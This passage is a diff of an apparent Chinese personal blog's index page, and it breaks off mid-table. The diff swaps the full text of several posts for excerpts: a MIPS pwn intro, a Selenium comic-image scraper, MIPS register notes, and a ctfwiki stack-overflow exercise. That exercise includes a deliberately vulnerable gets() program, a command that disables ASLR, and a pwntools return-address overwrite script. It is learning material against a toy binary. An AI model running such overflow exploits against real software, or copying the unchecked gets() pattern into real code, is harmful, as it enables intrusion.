@@ -330,13 +330,20 @@
       
         
           
-            <p><strong>从MIPS入手IOT逆向，先学习一两道题热身，思路主要来源是学长的博客，记录下写题的过程</strong></p>
-<p>主要参考资料：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/">HWS赛题入门MIPS Pwn</a></li>
-</ul>
+          从MIPS入手IOT逆向，先学习一两道题热身，思路主要来源是学长的博客，记录下写题的过程
+主要参考资料：
+
+HWS赛题入门MIPS Pwn
+
 
           
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/11/21/Pwn-MIPS-Mplogin/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -454,37 +461,20 @@
       
         
           
-            <p><img src="/2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/9.jpg" alt="9"></p>
-<p>想看化物语漫画，找到一家<a target="_blank" rel="noopener" href="http://manhua.kukudm.com/comiclist/2372/">网站</a>开始爬取，就当练习爬虫。使用python的selenium框架。</p>
-<p>首先进入主页按F12查看原码，可以看到所有章节的url信息都被存放在id为comiclistn的元素中</p>
-<p><img src="/2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/1.png" alt="1"></p>
-<p>这样就很容易根据id定位获取各个章节的url了，具体函数如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_TOF</span>(<span class="params">index_url</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    从主页面获取各章节url</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    url_list=[]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#模拟浏览器打开网站</span></span><br><span class="line">    browser=webdriver.Firefox(options=options)</span><br><span class="line">    browser.get(index_url)</span><br><span class="line">    browser.implicitly_wait(<span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#获取章节列表的元素</span></span><br><span class="line">    comics_list_id=browser.find_element_by_id(<span class="string">&quot;comiclistn&quot;</span>)</span><br><span class="line">    chapter_list=comics_list_id.find_elements_by_xpath(<span class="string">&quot;./*&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#生成章节列表</span></span><br><span class="line">    <span class="keyword">for</span> part <span class="keyword">in</span> chapter_list:</span><br><span class="line">        link=part.find_elements_by_tag_name(<span class="string">&#x27;a&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">        url_list.append(link.get_attribute(<span class="string">&#x27;href&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    browser.quit()</span><br><span class="line">    </span><br><span class="line">    Comics=<span class="built_in">dict</span>(name=Name,urls=url_list)</span><br><span class="line">    </span><br><span class="line">    print(<span class="string">&quot;目录信息爬取成功&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> Comics</span><br></pre></td></tr></table></figure>
-
-
-
-<p>打开具体章节第一页查看源码，需要首先找到页数信息，发现页数没有固定元素，动态生成在文本信息里，所以需要分析其所在的父类的文本内容，用正则表达式提取总页数数字。</p>
-<p><img src="/2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/2.png" alt="2"></p>
-<p>然后开始逐页提取图片的url和下一页链接的url</p>
-<p><img src="/2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/3.png" alt="3"></p>
-<p>具体函数如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pic</span>(<span class="params">Comics</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    根据主页面获取的信息逐章爬取图片</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    comic_list=Comics[<span class="string">&#x27;urls&#x27;</span>]</span><br><span class="line">    basedir=Comics[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    browser=webdriver.Firefox(options=options)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> comic_list:</span><br><span class="line">        <span class="comment">#打开某一章节页面</span></span><br><span class="line">        browser.get(url)</span><br><span class="line">        browser.implicitly_wait(<span class="number">5</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#在本地创建文件夹保存</span></span><br><span class="line">        dirname=basedir+<span class="string">&#x27;/&#x27;</span>+browser.title</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(dirname):</span><br><span class="line">            os.mkdir(dirname)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#获取页数</span></span><br><span class="line">        temptext=browser.find_element_by_xpath(<span class="string">&quot;//*[contains(text(),&#x27;共&#x27;)]&quot;</span>).text</span><br><span class="line">        pageNum=<span class="built_in">int</span>(re.findall(<span class="string">r&#x27;\d+&#x27;</span>,temptext)[<span class="number">1</span>])</span><br><span class="line">        </span><br><span class="line">        print(<span class="string">&#x27;开始爬取\t&#123;&#125;  &#x27;</span>.<span class="built_in">format</span>(browser.title)+<span class="string">&#x27;共&#x27;</span>+<span class="built_in">str</span>(pageNum)+<span class="string">&#x27;页&#x27;</span>)</span><br><span class="line">        <span class="comment">#逐页爬取图片</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,pageNum):</span><br><span class="line">            <span class="comment">#获取图片url</span></span><br><span class="line">            pic_url=browser.find_element_by_tag_name(<span class="string">&#x27;img&#x27;</span>).get_attribute(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">            filename=dirname+<span class="string">&#x27;/&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.jpg&#x27;</span></span><br><span class="line">            <span class="comment">#保存图片到本地</span></span><br><span class="line">            SavePic(filename,pic_url)</span><br><span class="line">            <span class="comment">#获取下一页url</span></span><br><span class="line">            NextPage = browser.find_elements_by_tag_name(<span class="string">&#x27;a&#x27;</span>)[-<span class="number">1</span>].get_attribute(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">            <span class="comment">#休息时间</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            browser.get(NextPage)</span><br><span class="line">        </span><br><span class="line">        print(<span class="string">&#x27;当前章节\t&#123;&#125;  下载完毕&#x27;</span>.<span class="built_in">format</span>(browser.title))</span><br><span class="line">    browser.quit()</span><br><span class="line">    print(<span class="string">&#x27;所有章节下载完毕&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>剩下就是导入的库、全局变量和执行部分</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">Name=<span class="string">&#x27;化物语&#x27;</span></span><br><span class="line">indexurl=<span class="string">&#x27;http://manhua.kukudm.com/comiclist/2372/&#x27;</span></span><br><span class="line">options=webdriver.FirefoxOptions()           </span><br><span class="line">options.headless=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">Comics=get_TOF(indexurl)</span><br><span class="line">get_pic(Comics)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>可以正常运行，就是太慢……还可能会卡在某一页……继续改进</p>
-<hr>
-<p>修复了因频繁访问被强制断开连接的问题并换了一个好点的wifi后勉强能用了，完整代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">Name=<span class="string">&#x27;化物语&#x27;</span></span><br><span class="line">indexurl=<span class="string">&#x27;http://manhua.kukudm.com/comiclist/2372/&#x27;</span></span><br><span class="line">options=webdriver.FirefoxOptions()           </span><br><span class="line">options.headless=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SavePic</span>(<span class="params">filename,url</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    保存单张图片的函数</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        content=requests.get(url).content</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        SavePic(filename,url)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_TOF</span>(<span class="params">index_url</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    从主页面获取各章节url</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    url_list=[]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#模拟浏览器打开网站</span></span><br><span class="line">    browser=webdriver.Firefox(options=options)</span><br><span class="line">    browser.get(index_url)</span><br><span class="line">    browser.implicitly_wait(<span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#获取章节列表的元素</span></span><br><span class="line">    comics_list_id=browser.find_element_by_id(<span class="string">&quot;comiclistn&quot;</span>)</span><br><span class="line">    chapter_list=comics_list_id.find_elements_by_xpath(<span class="string">&quot;./*&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#生成章节列表</span></span><br><span class="line">    <span class="keyword">for</span> part <span class="keyword">in</span> chapter_list:</span><br><span class="line">        link=part.find_elements_by_tag_name(<span class="string">&#x27;a&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">        url_list.append(link.get_attribute(<span class="string">&#x27;href&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    browser.quit()</span><br><span class="line">    </span><br><span class="line">    Comics=<span class="built_in">dict</span>(name=Name,urls=url_list)</span><br><span class="line">    </span><br><span class="line">    print(<span class="string">&quot;目录信息爬取成功&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> Comics</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pic</span>(<span class="params">Comics</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    根据主页面获取的信息逐章爬取图片</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    comic_list=Comics[<span class="string">&#x27;urls&#x27;</span>]</span><br><span class="line">    basedir=Comics[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    browser=webdriver.Firefox(options=options)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> comic_list:</span><br><span class="line">        <span class="comment">#打开某一章节页面</span></span><br><span class="line">        browser.get(url)</span><br><span class="line">        browser.implicitly_wait(<span class="number">10</span>)</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">        <span class="comment">#在本地创建文件夹保存</span></span><br><span class="line">        dirname=basedir+<span class="string">&#x27;/&#x27;</span>+<span class="built_in">str</span>(browser.title)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(dirname):</span><br><span class="line">            os.mkdir(dirname)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#获取页数</span></span><br><span class="line">        temptext=browser.find_element_by_xpath(<span class="string">&quot;//*[contains(text(),&#x27;共&#x27;)]&quot;</span>).text</span><br><span class="line">        pageNum=<span class="built_in">int</span>(re.findall(<span class="string">r&#x27;\d+&#x27;</span>,temptext)[<span class="number">1</span>])</span><br><span class="line">        </span><br><span class="line">        print(<span class="string">&#x27;开始爬取\t&#123;&#125;  &#x27;</span>.<span class="built_in">format</span>(browser.title)+<span class="string">&#x27;共&#x27;</span>+<span class="built_in">str</span>(pageNum)+<span class="string">&#x27;页&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        cururl=url</span><br><span class="line">        <span class="comment">#逐页爬取图片</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,pageNum+<span class="number">1</span>):</span><br><span class="line">            </span><br><span class="line">            browser.get(cururl)</span><br><span class="line">            <span class="comment">#获取图片url</span></span><br><span class="line">            pic_url=browser.find_element_by_tag_name(<span class="string">&#x27;img&#x27;</span>).get_attribute(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">            filename=dirname+<span class="string">&#x27;/&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.jpg&#x27;</span></span><br><span class="line">            <span class="comment">#保存图片到本地</span></span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">            SavePic(filename,pic_url)</span><br><span class="line">            <span class="comment">#获取下一页url</span></span><br><span class="line">            NextPage = browser.find_elements_by_tag_name(<span class="string">&#x27;a&#x27;</span>)[-<span class="number">1</span>].get_attribute(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">            cururl=NextPage</span><br><span class="line">        </span><br><span class="line">        print(<span class="string">&#x27;当前章节\t&#123;&#125;  下载完毕&#x27;</span>.<span class="built_in">format</span>(browser.title))</span><br><span class="line">        </span><br><span class="line">    browser.quit()</span><br><span class="line">    print(<span class="string">&#x27;所有章节下载完毕&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">Comics=get_TOF(indexurl)</span><br><span class="line">get_pic(Comics)</span><br></pre></td></tr></table></figure>
-
-<p>速度还是不够快，但selenium模拟浏览器操作也没法快到哪里去，以后可以考虑换个框架</p>
-
           
+想看化物语漫画，找到一家网站开始爬取，就当练习爬虫。使用python的selenium框架。
+首先进入主页按F12查看原码，可以看到所有章节的url信息都被存放在id为comiclistn的元素中
+
+这样就很容易根据id定位获取各个章节的url了，具体函数如下
+123456789101112131
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -602,41 +592,17 @@
       
         
           
-            <p><strong>模仿ctfwiki上实例进行首次pwn</strong></p>
-<h4 id="构建c语言可执行文件"><a href="#构建c语言可执行文件" class="headerlink" title="构建c语言可执行文件"></a>构建c语言可执行文件</h4><p>代码如下,原文件保存为stack_example.c：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123; <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>终端输入命令如下，其中m32指生成32位程序，-fno-stack-protector指不开启堆栈溢出保护，-no-pie指关闭PIE：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie stack_example.c -o stack_example</span><br></pre></td></tr></table></figure>
-
-<p>可以用checksec工具检查编译后的文件,命令和结果如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">checksec stack_example</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-
-<p>因为Linux平台下还有地址空间分布随机化（ASLR）机制，可以通过修改<code>/proc/sys/kernel/randomize_va_space</code>来控制ASLR，可以通过cat指令查看其选项值，具体为：</p>
-<ul>
-<li>0，关闭ASLR，无随机化，栈、堆、.so基地址每次都相同</li>
-<li>1，普通ASLR，栈基地址、mmap基地址、.so加载基地址随机化，堆基地址无随机化</li>
-<li>2，增强ASLR，在1的基础上增加了堆基地址随机化</li>
-</ul>
-<p>可使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭</p>
-<h4 id="分析可执行文件结构"><a href="#分析可执行文件结构" class="headerlink" title="分析可执行文件结构"></a>分析可执行文件结构</h4><p>用IDA打开可执行文件进行分析，可以看到vulnerable函数反编译后如下图所示：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vulnerable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看出字符串s距离ebp的长度为0x14,vulnerable函数对应的栈结构为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+   0x1C</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+   0x18</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+   0x14</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+   0</span><br></pre></td></tr></table></figure>
-
-<p>同时可以用IDA获取success地址，为0x0804843B</p>
-<p>由于gets会读到回车才结束，就可以直接读取任意长度字符串，若我们输入的字符串为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x18*&#39;a&#39;+success_addr</span><br></pre></td></tr></table></figure>
-
-<p>即可将success_addr覆盖retaddr内容，让程序执行success函数的内容。</p>
-<p>这里需要使用pwntools，具体python2脚本代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./stack_example&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa=<span class="number">0x0804843B</span></span><br><span class="line">pre=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">in0=pre+p32(sa)</span><br><span class="line"></span><br><span class="line">sh.sendline(in0)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>python3中由于bytes和string做了区分不能直接使用以上代码，暂时也没啥好的解决方案，暂时搁置。</p>
-<p>在python2环境中运行以上脚本就可以看到success函数执行对应的输出。</p>
-
-          
+          模仿ctfwiki上实例进行首次pwn
+构建c语言可执行文件代码如下,原文件保存为stack_example.c：
+12345678910111213#include &lt;stdio.h&gt;#include &lt;string.h&gt;void success() &#123; puts
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/11/19/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E9%A6%96%E6%AC%A1%E5%B0%9D%E8%AF%95/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -754,189 +720,37 @@
       
         
           
-            <p><strong>要学习IOT逆向，准备入手的思科路由器是MIPS架构，在开始动手前先熟悉一下MIPS相关基础</strong></p>
-<h4 id="1-特点"><a href="#1-特点" class="headerlink" title="1.特点"></a>1.特点</h4><ul>
-<li>MIPS指令为固定4字节</li>
-<li>内存中的数据访问必须严格对齐</li>
-<li>本身不支持NX</li>
-</ul>
-<h4 id="2-寄存器"><a href="#2-寄存器" class="headerlink" title="2.寄存器"></a>2.寄存器</h4><table>
-<thead>
-<tr>
-<th>寄存器编号</th>
-<th>名称</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>$0</td>
-<td>$zero</td>
-<td>总是返回常量0</td>
-</tr>
-<tr>
-<td>$1</td>
-<td>$at</td>
-<td>保留给汇编器，不可做其他用途</td>
-</tr>
-<tr>
-<td>$2-$3</td>
-<td>$v0-$v1</td>
-<td>函数调用返回值，非浮点</td>
-</tr>
-<tr>
-<td>$4-$7</td>
-<td>$a0-$a3</td>
-<td>函数调用参数，不够时使用堆栈传递</td>
-</tr>
-<tr>
-<td>$8-$15</td>
-<td>$t0-$t7</td>
-<td>临时寄存器</td>
-</tr>
-<tr>
-<td>$16-$23</td>
-<td>$s0-$s7</td>
-<td>保存，函数调用后这些寄存器需要被恢复</td>
-</tr>
-<tr>
-<td>$24-$25</td>
-<td>$t8-$t9</td>
-<td>临时寄存器的补充</td>
-</tr>
-<tr>
-<td>$28</td>
-<td>$gp</td>
-<td>全局指针，指向静态数据区中运行决定的地址</td>
-</tr>
-<tr>
-<td>$29</td>
-<td>$sp</td>
-<td>堆栈指针</td>
-</tr>
-<tr>
-<td>$30</td>
-<td>$fp/$s8</td>
-<td>栈帧指针</td>
-</tr>
-<tr>
-<td>$31</td>
-<td>$ra</td>
-<td>返回地址，用于支持函数调用和子程序</td>
-</tr>
-</tbody></table>
-<h4 id="3-指令集"><a href="#3-指令集" class="headerlink" title="3.指令集"></a>3.指令集</h4><p>MIPS指令长度为32位，其中指令位均为6位，其余26位可分为R型、I型、J型。常用参考指令表如下：</p>
-<table>
-<thead>
-<tr>
-<th>指令</th>
-<th>功能</th>
-<th>实例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>li</td>
-<td>将一个最大16位的数立即存入寄存器</td>
-<td>li $Rd, imm</td>
-</tr>
-<tr>
-<td>lui</td>
-<td>将一个最大16位的数立即放入寄存器的高16位，低16位补0</td>
-<td>lui $a1, 0x42</td>
-</tr>
-<tr>
-<td>lw</td>
-<td>从一个指定的地址加载一个字的值到寄存器</td>
-<td>lw $s0, 0($sp)</td>
-</tr>
-<tr>
-<td>sw</td>
-<td>将寄存器中的值存入指定地址</td>
-<td>sw $a0, 0($sp)</td>
-</tr>
-<tr>
-<td>add</td>
-<td>带符号数相加，目标数存于第一个寄存器地址内</td>
-<td>add $t0, $t1, $t2</td>
-</tr>
-<tr>
-<td>sub</td>
-<td>带符号数相减</td>
-<td>sub $t0, $t1, $t2</td>
-</tr>
-<tr>
-<td>mult</td>
-<td>乘法，结果存于(Hi,Lo)中</td>
-<td>mult $t3, $t4</td>
-</tr>
-<tr>
-<td>div</td>
-<td>除法，结果存于(Hi,Lo)中</td>
-<td>div $t5, $t6</td>
-</tr>
-<tr>
-<td>mfhi</td>
-<td>获取Hi中的数值到某寄存器</td>
-<td>mfhi $t0</td>
-</tr>
-<tr>
-<td>mflo</td>
-<td>获取Lo中的数值到某寄存器</td>
-<td>mflo $t1</td>
-</tr>
-<tr>
-<td>beq</td>
